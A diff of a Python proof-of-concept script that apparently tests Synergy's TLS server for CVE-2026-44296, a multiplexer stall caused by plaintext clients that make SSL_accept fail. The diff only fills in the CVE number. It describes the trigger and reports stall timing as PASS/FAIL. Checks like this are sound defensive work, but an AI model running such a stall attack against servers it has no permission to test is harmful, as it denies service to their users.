@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-CVE-XXXX-XXXXX — Synergy TLS server multiplexer stall on failed SSL_accept.
+CVE-2026-44296 — Synergy TLS server multiplexer stall on failed SSL_accept.
 
 A plaintext TCP client whose first bytes aren't a valid TLS ClientHello drives
 src/lib/net/SecureSocket.cpp::secureAccept into its `isFatal()` branch, which
@@ -108,7 +108,7 @@ def main():
 
     host = normalize_host(args.host)
 
-    print(f"CVE-XXXX-XXXXX — TLS multiplexer stall on failed SSL_accept")
+    print(f"CVE-2026-44296 — TLS multiplexer stall on failed SSL_accept")
     print(f"target: {host}:{args.port}  stalls: {args.stalls}\n")
 
     print("[*] collecting baseline hello rtt (no attack)")
@@ -132,7 +132,7 @@ def main():
         t.join(timeout=30.0)
 
     if not during:
-        print("[FAIL] server stopped responding during attack — VULNERABLE (CVE-XXXX-XXXXX)")
+        print("[FAIL] server stopped responding during attack — VULNERABLE (CVE-2026-44296)")
         return 1
 
     during_median = statistics.median(during)
@@ -142,7 +142,7 @@ def main():
     print(f"  overhead:      {overhead*1000:.0f} ms (threshold {floor*1000:.0f} ms)")
 
     if overhead >= floor:
-        print(f"[FAIL] multiplexer stalled by {overhead*1000:.0f} ms — VULNERABLE (CVE-XXXX-XXXXX)")
+        print(f"[FAIL] multiplexer stalled by {overhead*1000:.0f} ms — VULNERABLE (CVE-2026-44296)")
         return 1
 
     print("[PASS] no significant multiplexer stall — fix appears in place")
